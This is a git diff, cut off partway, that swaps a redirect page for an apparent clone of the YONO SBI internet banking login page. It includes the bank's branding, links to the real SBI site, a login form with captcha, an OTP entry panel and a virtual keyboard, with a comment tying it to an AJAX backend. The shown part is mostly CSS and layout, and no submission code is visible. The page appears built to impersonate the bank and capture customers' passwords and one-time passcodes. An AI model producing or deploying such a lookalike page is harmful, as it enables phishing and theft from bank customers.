@@ -1,21 +1,2265 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0;url=templates/index.php">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting...</title>
-  <script>
-    // Instant JS redirect as primary; meta-refresh is fallback
-    window.location.replace('templates/index.php');
-  </script>
+  <title>YONO SBI - Internet Banking</title>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND DEPENDENCY --DO NOT MODIFY
+       jQuery required by AJAX call
+       ═══════════════════════════════════════════════════════════════ -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="../templates/assets/icons/sbi_fav.svg">
+
   <style>
-    body { margin:0; background:#020c1b; display:flex; align-items:center;
-           justify-content:center; min-height:100vh;
-           font-family:sans-serif; color:#94a3b8; }
+    /* ── RESET ─────────────────────────────────────────────────── */
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    .mobile-break {
+      display: none;
+    }
+
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f7f5fb;
+      min-height: 100vh;
+      overflow-x: hidden;
+      color: #333;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    /* ── TOP BAR ───────────────────────────────────────────────── */
+    .top-bar-wrapper {
+      background: #4F286F;
+      width: 100%;
+    }
+
+    .top-bar {
+      max-width: 1400px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 6%;
+      min-height: 36px;
+      font-size: 12px;
+      color: #fff;
+    }
+
+    .top-bar .badge {
+      background: #EFEAF5;
+      color: #4F286F;
+      padding: 8px 24px 6px;
+      border-radius: 12px 12px 0 0;
+      font-weight: 600;
+      font-size: 13px;
+      align-self: flex-end;
+      margin-left: 181px;
+    }
+
+    .top-bar .links {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .top-bar .links a {
+      color: #fff;
+      font-size: 12px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      transition: color 0.2s;
+    }
+
+    .top-bar .links a.skip-link {
+      text-decoration: underline;
+      font-weight: 400;
+    }
+
+    .top-bar .links a:hover {
+      color: #fff;
+      text-decoration: underline;
+    }
+
+    .top-bar .links .sep {
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 12px;
+      user-select: none;
+    }
+
+    .top-bar .lang-selector {
+      color: #fff;
+      font-size: 12px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      cursor: pointer;
+    }
+
+    .top-bar .font-size {
+      display: flex;
+      gap: 6px;
+      align-items: center;
+      color: #fff;
+      font-weight: 500;
+      font-size: 13px;
+      margin-left: 4px;
+    }
+
+    .top-bar .font-size span {
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .top-bar .font-size span:hover {
+      color: #fff;
+    }
+
+    /* ── NAVBAR ────────────────────────────────────────────────── */
+    .navbar-wrapper {
+      background: #fff;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+      position: relative;
+      z-index: 10;
+    }
+
+    .navbar {
+      max-width: 1400px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      padding: 0 6%;
+    }
+
+    .navbar .logo {
+      display: flex;
+      align-items: center;
+      padding: 10px 0;
+      margin-right: 30px;
+    }
+
+    .navbar nav {
+      display: flex;
+      gap: 6px;
+      align-items: center;
+    }
+
+    .navbar nav a {
+      padding: 10px 18px 14px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #333;
+      border-radius: 6px;
+      transition: all 0.2s;
+      position: relative;
+    }
+
+    .navbar nav a:hover {
+      color: #673391;
+      text-decoration: none;
+      background: #F1F0F4;
+    }
+
+    .navbar nav a.active {
+      color: #673391;
+      text-decoration: none;
+      background: #F1F0F4;
+      font-weight: 600;
+    }
+
+    .navbar nav a.active::after {
+      content: '';
+      position: absolute;
+      bottom: 8px;
+      left: 20px;
+      right: 20px;
+      height: 2px;
+      background: #673391;
+      border-radius: 2px;
+    }
+
+    /* ── MAIN CONTENT (HERO AREA WITH WAVES) ──────────────────── */
+    .main-wrapper {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      min-height: calc(100vh - 105px);
+      background: #f7f5fb;
+      overflow: hidden;
+      justify-content: space-between;
+    }
+
+    /* Background Waves & Blobs */
+    .hero-bg {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .hero-bg .circle-left-1 {
+      position: absolute;
+      top: -80px;
+      left: -20px;
+      width: 380px;
+      height: 380px;
+      background: rgba(103, 51, 145, 0.06);
+      border-radius: 50%;
+    }
+
+    .hero-bg .circle-left-2 {
+      position: absolute;
+      top: 130px;
+      left: -110px;
+      width: 200px;
+      height: 200px;
+      background: rgba(103, 51, 145, 0.09);
+      border-radius: 50%;
+    }
+
+    .hero-bg .circle-right-1 {
+      position: absolute;
+      bottom: -60px;
+      right: 100px;
+      width: 300px;
+      height: 300px;
+      background: rgba(103, 51, 145, 0.06);
+      border-radius: 50%;
+    }
+
+    .hero-bg .circle-right-2 {
+      position: absolute;
+      bottom: 20px;
+      right: -80px;
+      width: 500px;
+      height: 500px;
+      background: rgba(103, 51, 145, 0.12);
+      border-radius: 50%;
+    }
+
+    .hero-bg .circle-right-3 {
+      position: absolute;
+      top: 55%;
+      transform: translateY(-50%);
+      right: -120px;
+      width: 260px;
+      height: 260px;
+      background: rgba(103, 51, 145, 0.07);
+      border-radius: 50%;
+    }
+
+    .hero-bg .waves-svg {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 55%;
+      z-index: 1;
+    }
+
+    /* Hero Content (Welcome + Login Card) */
+    .hero-content {
+      position: relative;
+      z-index: 2;
+      max-width: 1400px;
+      margin: 0 auto;
+      width: 100%;
+      padding: 40px 6%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex: 1;
+      gap: 40px;
+    }
+
+    /* Left section --welcome */
+    .welcome-section {
+      max-width: 540px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .welcome-section h1 {
+      position: relative;
+      display: inline-block;
+      font-size: 5em;
+      font-weight: 450;
+      line-height: 1.2;
+      color: transparent;
+      background: linear-gradient(90deg, #673391 15%, #b22382 40%, #e8388e 70%, #ff4da3 100%);
+      background-clip: text;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      paint-order: stroke fill;
+      padding-top: 5px;
+      margin-bottom: 12px;
+    }
+
+    .welcome-section h2 {
+      font-size: 22px;
+      font-weight: 500;
+      color: #1e293b;
+      margin-bottom: 28px;
+    }
+
+    .new-user-section .label {
+      font-size: 19px;
+      font-weight: 500;
+      color: #4F286F;
+      margin-bottom: 6px;
+    }
+
+    .new-user-section .desc {
+      font-size: 12.5px;
+      color: #64748b;
+      margin-bottom: 22px;
+      line-height: 1.4;
+      max-width: 100%;
+      white-space: nowrap;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .btn-register {
+      background: #673391;
+      color: #fff;
+      border: none;
+      padding: 13px 50px;
+      border-radius: 25px;
+      font-size: 15.5px;
+      font-weight: 500;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(103, 51, 145, 0.25);
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-register:hover {
+      background: #4F286F;
+      transform: translateY(-1px);
+    }
+
+    .btn-activate {
+      background: #fff;
+      color: #673391;
+      border: 1px solid #673391;
+      padding: 12px 39px;
+      border-radius: 25px;
+      font-size: 15.5px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s, transform 0.1s;
+    }
+
+    .btn-activate:hover {
+      background: rgba(103, 51, 145, 0.05);
+      transform: translateY(-1px);
+    }
+
+    .open-account-link {
+      margin-top: 45px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    .open-account-link a {
+      color: #673391;
+      font-weight: 700;
+      text-decoration: underline;
+    }
+
+    /* Right section --floating login form */
+    .login-section {
+      width: 420px;
+      background: #fff;
+      padding: 36px 36px;
+      border-radius: 12px;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.08);
+      position: relative;
+      z-index: 3;
+    }
+
+    .login-section .form-title {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 700;
+      color: #673391;
+      margin-bottom: 26px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: none;
+    }
+
+    .floating-input {
+      position: relative;
+      padding-top: 14px;
+    }
+
+    .floating-input label {
+      position: absolute;
+      top: 20px;
+      left: 0;
+      font-size: 15px;
+      font-weight: 500;
+      color: #777;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      display: block;
+      margin: 0;
+    }
+
+    .floating-input input[type="text"],
+    .floating-input input[type="password"] {
+      width: 100%;
+      padding: 6px 0 8px 0;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      border-radius: 0;
+      font-size: 15px;
+      color: #333;
+      outline: none;
+      background: transparent;
+      transition: border-color 0.2s;
+    }
+
+    .floating-input input[type="text"]:focus,
+    .floating-input input[type="password"]:focus {
+      border-bottom: 1.5px solid #673391;
+    }
+
+    .floating-input input[type="password"] {
+      padding-right: 70px;
+    }
+
+    .floating-input input:focus ~ label,
+    .floating-input input:not(:placeholder-shown) ~ label {
+      top: 0px;
+      font-size: 12px;
+      color: #673391;
+    }
+
+    .form-group .input-icons {
+      position: absolute;
+      right: 0;
+      bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .form-group .input-icons .icon-btn {
+      cursor: pointer;
+      color: #444;
+      font-size: 16px;
+      background: none;
+      border: none;
+      padding: 2px 4px;
+      transition: color 0.2s;
+    }
+
+    .form-group .input-icons .icon-btn:hover {
+      color: #673391;
+    }
+
+    .form-group .input-icons .kbd-btn {
+      border: 1px solid #673391;
+      border-radius: 5px;
+      padding: 2px 6px;
+      color: #673391;
+      background: #fff;
+      font-size: 13px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s;
+    }
+
+    .form-group .input-icons .kbd-btn:hover {
+      background: #F1F0F4;
+    }
+
+    .forgot-link {
+      display: inline-block;
+      font-size: 12px;
+      color: #673391;
+      margin-top: 6px;
+      text-decoration: underline;
+    }
+
+    .forgot-link:hover {
+      color: #4F286F;
+    }
+
+    /* Captcha */
+    .captcha-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 24px;
+      margin-bottom: 26px;
+    }
+
+    /* Captcha inputs use .floating-input */
+
+    .captcha-image {
+      background: #fafafa;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 6px 12px;
+      font-family: 'Courier New', monospace;
+      font-size: 20px;
+      font-weight: 700;
+      color: #222;
+      letter-spacing: 3px;
+      user-select: none;
+      position: relative;
+      min-width: 105px;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .captcha-image::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 5%;
+      width: 90%;
+      height: 1.5px;
+      background: #666;
+      transform: rotate(-6deg);
+    }
+
+    .captcha-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      align-items: center;
+    }
+
+    .captcha-icon-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      border: 1px solid #ddd;
+      background: #fff;
+      color: #673391;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s;
+      padding: 0;
+    }
+
+    .captcha-icon-btn:hover {
+      border-color: #673391;
+      background: #F1F0F4;
+    }
+
+    /* Login button */
+    .btn-login {
+      width: 100%;
+      padding: 13px;
+      background: #ebebeb;
+      color: #999;
+      border: 1px solid #ddd;
+      border-radius: 25px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: all 0.3s;
+      margin-bottom: 14px;
+    }
+
+    .btn-login.active {
+      background: #673391;
+      color: #fff;
+      border-color: #673391;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(103, 51, 145, 0.25);
+    }
+
+    .btn-login.active:hover {
+      background: #4F286F;
+    }
+
+    .lock-user-link {
+      text-align: right;
+    }
+
+    .lock-user-link a {
+      font-size: 12px;
+      color: #673391;
+      text-decoration: underline;
+    }
+
+    /* Success / Error messages */
+    .form-message {
+      text-align: center;
+      padding: 10px;
+      border-radius: 6px;
+      margin-bottom: 16px;
+      font-size: 13px;
+      display: none;
+    }
+
+    .form-message.error {
+      background: #fef2f2;
+      color: #991b1b;
+      border: 1px solid #fecaca;
+    }
+
+    .form-message.success {
+      background: #f0fdf4;
+      color: #166534;
+      border: 1px solid #bbf7d0;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* ── QUICK ACTIONS SECTION ────────────────────────────────── */
+    .quick-actions-wrapper {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      padding: 20px 6% 35px;
+      color: #fff;
+    }
+
+    .quick-actions {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    .qa-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 24px;
+    }
+
+    .qa-grid {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .qa-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 95px;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    .qa-item:hover {
+      transform: translateY(-4px);
+    }
+
+    .qa-icon {
+      width: 48px;
+      height: 48px;
+      background: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #673391;
+      margin-bottom: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      transition: box-shadow 0.2s;
+    }
+
+    .qa-item:hover .qa-icon {
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.25);
+    }
+
+    .qa-label {
+      font-size: 11.5px;
+      color: #fff;
+      text-align: center;
+      line-height: 1.3;
+      font-weight: 500;
+    }
+
+    /* ── RESPONSIVE ───────────────────────────────────────────── */
+    @media (max-width: 1200px) {
+      .hero-content {
+        padding: 40px 4%;
+        gap: 30px;
+      }
+
+      .navbar {
+        padding: 0 4%;
+      }
+
+      .navbar .logo {
+        margin-right: 25px;
+      }
+    }
+
+    @media (max-width: 1024px) {
+      .hero-content {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 40px 5%;
+      }
+
+      .welcome-section {
+        max-width: 100%;
+        text-align: left;
+        margin-bottom: 20px;
+      }
+
+      .btn-group {
+        justify-content: flex-start;
+      }
+
+      .login-section {
+        width: 100%;
+        max-width: 440px;
+      }
+
+      .qa-grid {
+        justify-content: center;
+        gap: 20px;
+      }
+
+      .hero-bg .circle-left-1 {
+        width: 380px;
+        height: 380px;
+        top: -80px;
+        left: 5%;
+      }
+
+      .hero-bg .circle-left-2 {
+        width: 340px;
+        height: 340px;
+        top: 80px;
+        left: -170px;
+      }
+
+      .hero-bg .circle-right-2 {
+        width: 440px;
+        height: 440px;
+        top: auto;
+        bottom: 40px;
+        right: -100px;
+      }
+
+      .hero-bg .circle-right-1 {
+        width: 250px;
+        height: 250px;
+        top: auto;
+        bottom: -40px;
+        right: 60px;
+      }
+    }
+
+    /* ── HAMBURGER & DRAWER ───────────────────────────────────── */
+    .hamburger {
+      display: none;
+      cursor: pointer;
+      padding: 5px;
+    }
+
+    .drawer-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      height: 100dvh;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+    }
+
+    .side-drawer {
+      position: fixed;
+      top: 0;
+      left: -100%;
+      width: 85%;
+      max-width: 380px;
+      height: 100vh;
+      height: 100dvh;
+      background: #fff;
+      z-index: 1001;
+      transition: left 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 2px 0 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .side-drawer.open {
+      left: 0;
+    }
+
+    .drawer-header {
+      display: flex;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid #eee;
+      position: relative;
+    }
+
+    .drawer-close {
+      position: absolute;
+      left: 20px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      color: #673391;
+      cursor: pointer;
+    }
+
+    .drawer-tabs {
+      display: flex;
+      margin: 20px;
+      background: #fff;
+      border-radius: 20px;
+      border: 1px solid #d5c9e2;
+      overflow: hidden;
+    }
+
+    .drawer-tab {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #333;
+      cursor: pointer;
+    }
+
+    .drawer-tab.active {
+      background: #eadef4;
+      color: #4F286F;
+    }
+
+    .drawer-links {
+      display: flex;
+      flex-direction: column;
+      padding: 0 20px;
+    }
+
+    .drawer-links a {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 0;
+      text-decoration: none;
+      color: #333;
+      font-size: 15px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .drawer-links a .arrow {
+      color: #673391;
+      font-weight: bold;
+    }
+
+    .drawer-bottom-links {
+      padding: 10px 20px;
+    }
+
+    .drawer-bottom-links a {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      text-decoration: none;
+      color: #4F286F;
+      font-size: 14px;
+      background: #eadef4;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+
+    .drawer-footer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 0;
+      margin: 0 20px;
+      border-top: 1px solid #d5c9e2;
+      font-size: 14px;
+    }
+
+    .drawer-footer .font-size {
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    @media (max-width: 768px) {
+      .top-bar-wrapper {
+        display: none;
+      }
+
+      .hamburger {
+        display: block;
+      }
+
+      .navbar {
+        flex-direction: row;
+        justify-content: flex-start;
+        align-items: center;
+        padding: 12px 20px;
+        gap: 15px;
+      }
+
+      .navbar nav {
+        display: none;
+      }
+
+      .navbar .logo {
+        margin: 0;
+      }
+
+      .qa-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 20px 10px;
+        width: 100%;
+      }
+
+      .hero-bg .circle-left-1 {
+        top: -60px;
+        left: -150px;
+        width: 400px;
+        height: 400px;
+      }
+
+      .hero-bg .circle-left-2 {
+        width: 200px;
+        height: 200px;
+        top: 250px;
+        left: -90px;
+      }
+
+      .hero-bg .circle-right-2 {
+        width: 380px;
+        height: 380px;
+        top: auto;
+        bottom: 30px;
+        right: -80px;
+      }
+
+      .hero-bg .circle-right-1 {
+        width: 200px;
+        height: 200px;
+        top: auto;
+        bottom: -30px;
+        right: 40px;
+      }
+
+      .hero-bg .circle-right-3 {
+        width: 220px;
+        height: 220px;
+        top: 25%;
+        right: 120px;
+      }
+
+      .hero-bg .waves-svg {
+        display: none;
+      }
+
+      .quick-actions-wrapper {
+        background: #4F286F;
+        padding-top: 10px;
+        position: relative;
+        margin-top: 80px;
+        z-index: 2;
+      }
+
+      .quick-actions-wrapper::before {
+        content: "";
+        position: absolute;
+        bottom: 100%;
+        left: 0;
+        width: 100%;
+        height: 120px;
+        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 1440 500' preserveAspectRatio='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0,180 C350,230 850,300 1440,140 L1440,500 L0,500 Z' fill='%2376479B'/%3E%3Cpath d='M0,205 C350,255 850,325 1440,165 L1440,500 L0,500 Z' fill='%234F286F'/%3E%3C/svg%3E");
+        background-size: 100% 100%;
+        background-position: bottom;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .welcome-section h1 {
+        font-size: 65px;
+      }
+
+      .mobile-break {
+        display: block;
+      }
+
+      .welcome-section h2 {
+        font-size: 20px;
+        max-width: 100%;
+        line-height: 1.3;
+        margin-bottom: 25px;
+      }
+
+      .btn-group {
+        flex-direction: row;
+        width: auto;
+        gap: 10px;
+      }
+
+      .btn-register,
+      .btn-activate {
+        width: auto;
+        padding: 12px 35px;
+        font-size: 14.5px;
+        text-align: center;
+      }
+
+      .hero-content {
+        padding: 30px 10px;
+        gap: 25px;
+      }
+
+      .login-section {
+        width: 100%;
+        max-width: 100%;
+        padding: 28px 20px;
+      }
+
+      .qa-grid {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 25px 10px;
+      }
+
+      .hero-bg .waves-svg {
+        height: 600px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .welcome-section h1 {
+        font-size: 64px;
+      }
+
+      .login-section {
+        padding: 24px 16px;
+      }
+
+      .hero-bg .waves-svg {
+        height: 560px;
+      }
+    }
+
+    /* ── OTP RIGHT-SIDE PANEL ─────────────────────────────────── */
+    .otp-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.35);
+      z-index: 999;
+    }
+
+    .otp-panel {
+      position: fixed;
+      top: 0;
+      right: -420px;
+      width: 380px;
+      height: 100%;
+      background: linear-gradient(170deg, #76479B 0%, #673391 40%, #4F286F 100%);
+      z-index: 1000;
+      padding: 44px 36px 36px;
+      display: flex;
+      flex-direction: column;
+      box-shadow: -6px 0 30px rgba(0, 0, 0, 0.3);
+      transition: right 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .otp-panel.open {
+      right: 0;
+    }
+
+    /* Close button */
+    .otp-close-btn {
+      position: absolute;
+      top: 18px;
+      right: 20px;
+      background: none;
+      border: none;
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 24px;
+      cursor: pointer;
+      line-height: 1;
+      padding: 4px;
+      transition: color 0.2s;
+    }
+
+    .otp-close-btn:hover {
+      color: #fff;
+    }
+
+    /* Greeting */
+    .otp-greeting {
+      font-size: 22px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 16px;
+    }
+
+    /* Message */
+    .otp-message {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.85);
+      margin-bottom: 50px;
+      line-height: 1.55;
+    }
+
+    /* OTP digit inputs */
+    .otp-input-wrapper {
+      margin-bottom: 10px;
+    }
+
+    .otp-digits-row {
+      display: flex;
+      gap: 12px;
+      justify-content: flex-start;
+      margin-bottom: 0;
+    }
+
+    .otp-digit {
+      width: 40px;
+      height: 38px;
+      border: none;
+      border-bottom: 2px solid rgba(255, 255, 255, 0.4);
+      border-radius: 0;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+      background: transparent;
+      outline: none;
+      transition: border-color 0.2s;
+      caret-color: #fff;
+    }
+
+    .otp-digit::placeholder {
+      color: rgba(255, 255, 255, 0.3);
+    }
+
+    .otp-digit:focus {
+      border-bottom-color: #fff;
+    }
+
+    .otp-eye-row {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      margin-top: 4px;
+      margin-bottom: 16px;
+    }
+
+    .otp-eye-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: rgba(255, 255, 255, 0.7);
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      transition: color 0.2s;
+    }
+
+    .otp-eye-btn:hover {
+      color: #fff;
+    }
+
+    /* Resend OTP row */
+    .otp-resend-row {
+      font-size: 14px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 40px;
+    }
+
+    .otp-resend-row strong {
+      color: #fff;
+    }
+
+    #resendOtpLink {
+      color: #fff;
+      font-weight: 700;
+      cursor: pointer;
+      text-decoration: underline;
+      display: none;
+    }
+
+    #resendOtpLink:hover {
+      color: rgba(255, 255, 255, 0.85);
+    }
+
+    /* Proceed button */
+    .btn-proceed {
+      width: 100%;
+      padding: 14px;
+      background: rgba(255, 255, 255, 0.2);
+      color: rgba(255, 255, 255, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      border-radius: 28px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: all 0.3s;
+      margin-top: auto;
+    }
+
+    .btn-proceed.active {
+      background: #fff;
+      color: #673391;
+      border-color: #fff;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.15);
+    }
+
+    .btn-proceed.active:hover {
+      background: #F1F0F4;
+    }
+
+    @media (max-width: 480px) {
+      .otp-panel {
+        width: 100%;
+        right: -100%;
+        padding: 36px 24px 28px;
+      }
+
+      .otp-digit {
+        width: 36px;
+        height: 34px;
+        font-size: 18px;
+      }
+    }
+
+    /* Virtual Keyboard */
+    .input-wrapper {
+      position: relative;
+    }
+
+    .virtual-keyboard {
+      position: absolute;
+      top: 100%;
+      right: -20px;
+      width: 480px;
+      background: #fdfdfd;
+      border: 1px solid #e0d0ff;
+      border-radius: 8px;
+      padding: 10px;
+      margin-top: 8px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .vk-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 4px;
+    }
+
+    .vk-key {
+      flex: 1;
+      height: 36px;
+      background: #f1f2f3;
+      border: 1px solid #e2e3e4;
+      border-radius: 6px;
+      color: #4F286F;
+      font-size: 16px;
+      font-family: monospace;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.1s;
+      user-select: none;
+      padding: 0;
+    }
+
+    .vk-key:hover {
+      background: #e3d6f5;
+      border-color: #c9b1e9;
+    }
+
+    .vk-key:active {
+      background: #c9b1e9;
+    }
+
+    .vk-controls .vk-key {
+      font-family: 'Roboto', sans-serif;
+      font-weight: 500;
+      font-size: 12px;
+    }
+
+    .vk-caps {
+      flex: 2;
+      line-height: 1.1;
+    }
+
+    .vk-clear,
+    .vk-backspace {
+      flex: 3;
+    }
+
+    .vk-caps.active {
+      background: #673391;
+      color: #fff;
+    }
+
+    @media (max-width: 480px) {
+      .virtual-keyboard {
+        position: fixed;
+        top: auto;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        width: 100%;
+        margin: 0;
+        border-radius: 12px 12px 0 0;
+        padding: 8px;
+        gap: 4px;
+      }
+
+      .vk-key {
+        height: 40px;
+        font-size: 14px;
+      }
+    }
   </style>
 </head>
+
 <body>
-  <p>Loading&hellip;</p>
+
+  <!-- ── TOP BAR ────────────────────────────────────────────── -->
+  <div class="top-bar-wrapper">
+    <div class="top-bar">
+      <span class="badge">Personal Banking</span>
+      <div class="links">
+        <a href="#" class="skip-link">Skip to main content</a>
+        <span class="sep">|</span>
+        <a href="https://sbi.bank.in/" target="_blank">Corporate website
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path d="M2 22h20" />
+            <path d="M2 10h20" />
+            <path d="M12 2l10 8H2z" />
+            <path d="M6 10v8" />
+            <path d="M10 10v8" />
+            <path d="M14 10v8" />
+            <path d="M18 10v8" />
+          </svg>
+        </a>
+        <span class="sep">|</span>
+        <a href="https://yonoretail.sbi.bank.in/registration/services/complaint/help-center" target="_blank">Get Help
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="6" width="20" height="12" rx="2" />
+            <polygon points="10 9 15 12 10 15 10 9" />
+          </svg>
+        </a>
+        <span class="sep">|</span>
+        <a href="https://sbi.bank.in/web/personal-banking/digital/whatsapp-banking" target="_blank">WhatsApp
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path
+              d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />
+          </svg>
+        </a>
+        <span class="sep">|</span>
+        <span class="lang-selector">English <svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M6 9l6 6 6-6" />
+          </svg></span>
+        <span class="sep">|</span>
+        <div class="font-size">
+          <span id="btnFontMinus" title="Decrease font size">A-</span>
+          <span id="btnFontReset" title="Reset font size">A</span>
+          <span id="btnFontPlus" title="Increase font size">A+</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── NAVBAR ─────────────────────────────────────────────── -->
+  <div class="navbar-wrapper">
+    <div class="navbar">
+      <!-- Hamburger Icon (Mobile) -->
